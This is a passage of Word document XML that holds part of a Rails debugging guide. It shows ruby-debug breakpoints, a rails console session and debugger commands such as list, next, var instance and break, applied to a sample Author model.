        <w:t xml:space="preserve"> statement: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9C3E236" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="135FC744" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Author &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C6C2836" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :editorial</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C4F7569" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F581629" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0156F4A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>find_recent_comments(limit = 10)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FF417EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    debugger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52471C4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @recent_comments</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>||= comments.where("created_at &gt; ?", 1.week.ago).limit(limit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D1540FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="036AF84A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2AC9F55B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use ruby-debug while using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails console</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Just remember to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>require "ruby-debug"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> before calling the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debugger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</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D471C6A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20D65F54" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails console</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B13E6FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Loading development environment (Rails 3.1.0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25917112" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&gt;&gt; require "ruby-debug"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57AB8E5D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B8162EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&gt;&gt; author = Author.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DBCC91B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; #&lt;Author id: 1, first_name: "Bob", last_name: "Smith", created_at: "2008-07-31 12:46:10", updated_at: "2008-07-31 12:46:10"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E7BF4D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&gt;&gt; author.find_recent_comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="646CA263" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/PathTo/project/app/models/author.rb:11</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="369E9857" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C1A1468" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>With the code stopped, take a look around:</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275EC289" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F8DA408" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) list</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77DAC755" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[2, 9] in /PathTo/project/app/models/author.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F1DEE9C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   2    has_one :editorial</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A578B58" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   3    has_many :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B89A368" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A4EB0F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   5    def find_recent_comments(limit = 10)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57E7A1A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   6      debugger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C31B77E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 7      @recent_comments ||= comments.where("created_at &gt; ?", 1.week.ago).limit(limit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A595A94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   8    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60F4B8B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>   9  end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7959BFE2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You are at the end of the line, but… was this line executed? You can inspect the instance variables.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27152D9C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03233133" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) var instance</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78231ACF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@attributes = {"updated_at"=&gt;"2008-07-31 12:46:10", "id"=&gt;"1", "first_name"=&gt;"Bob", "las...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75C87A9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@attributes_cache = {}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="72837949" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@recent_comments</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hasn’t been defined yet, so it’s clear that this line hasn’t been executed yet. Use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command to move on in the code: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552AC40" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38D0C787" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) next</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C834FFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/PathTo/project/app/models/author.rb:12</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14A0CE32" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@recent_comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7812FE7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) var instance</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BBA4008" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@attributes = {"updated_at"=&gt;"2008-07-31 12:46:10", "id"=&gt;"1", "first_name"=&gt;"Bob", "las...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="033729FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@attributes_cache = {}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76524910" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@comments = []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DC9E493" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@recent_comments = []</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5FA6ECB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now you can see that the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@comments</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> relationship was loaded and @recent_comments defined because the line was executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D3FDAD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to go deeper into the stack trace you can move single </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>steps</w:t>
      </w:r>
      <w:r>
        <w:t>, through your calling methods and into Rails code. This is one of the best ways to find bugs in your code, or perhaps in Ruby or Rails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB79D7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.7 Breakpoints</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B21440A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A breakpoint makes your application stop whenever a certain point in the program is reached. The debugger shell is invoked in that line.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163BEAA2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can add breakpoints dynamically with the command </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (or just </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:t>). There are 3 possible ways of adding breakpoints manually:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A508C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="348"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>break line</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: set breakpoint in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>line</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the current source file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4E1EB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="348"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>break file:line [if expression]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: set breakpoint in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>line</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> number inside the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. If an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>expression</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is given it must evaluated to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to fire up the debugger.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FD58AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="348"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>break class(.|\#)method [if expression]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: set breakpoint in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>method</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (. and \# for class and instance method respectively) defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>expression</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> works the same way as with file:line.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DD460FA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A3FCAE7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:5) break 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C57C2AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Breakpoint 1 file /PathTo/project/vendor/rails/actionpack/lib/action_controller/filters.rb, line 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="57995A05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>info breakpoints _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>info break _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to list breakpoints. If you supply a number, it lists that breakpoint. Otherwise it lists all breakpoints.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="56B5BB8F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="311F4DC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:5) info breakpoints</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18F6BA16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Num Enb What</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C4D90B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  1 y   at filters.rb:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="14E93930" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To delete breakpoints: use the command </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>delete _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to remove the breakpoint number </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>. If no number is specified, it deletes all breakpoints that are currently active..</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0A203B6C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
